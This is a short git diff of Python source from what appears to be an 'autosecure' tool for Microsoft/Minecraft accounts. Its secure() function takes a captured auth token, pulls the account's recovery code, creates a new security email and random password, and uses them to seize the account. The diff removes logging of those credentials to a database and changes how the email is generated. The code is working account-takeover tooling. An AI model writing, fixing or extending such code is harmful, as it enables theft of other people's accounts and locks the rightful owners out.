@@ -20,12 +20,10 @@ from views.utils.minecraft.getMethod import getMethod
 from views.utils.minecraft.getCapes import getCapes
 from views.utils.minecraft.getXBL import getXBL
 
-from database.database import DBConnection
 import uuid
 import json
 
 ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]
-database = DBConnection()
 
 async def secure(msaauth: str):
 
@@ -167,14 +165,11 @@ async def secure(msaauth: str):
             )
             print(f"[+] - Got Recovery Code | {recoveryCode}")
 
-            secEmail = f"{uuid.uuid4().hex[:16]}@airsworld.net"
+            secEmail = uuid.uuid4().hex[:16]
             newPassword = uuid.uuid4().hex[:12]
 
-            emailToken = await generateEmail(secEmail, newPassword)
+            secEmail, emailToken = await generateEmail(secEmail, newPassword)
 
-            print(f"[+] - Generated Security Email ({secEmail})")
-            database.addEmail(secEmail, newPassword)
-            
             print("[~] - Automaticly Securing Account...")
             newData = await recoveryCodeSecure(sEmail, recoveryCode, secEmail, newPassword, emailToken) 
 
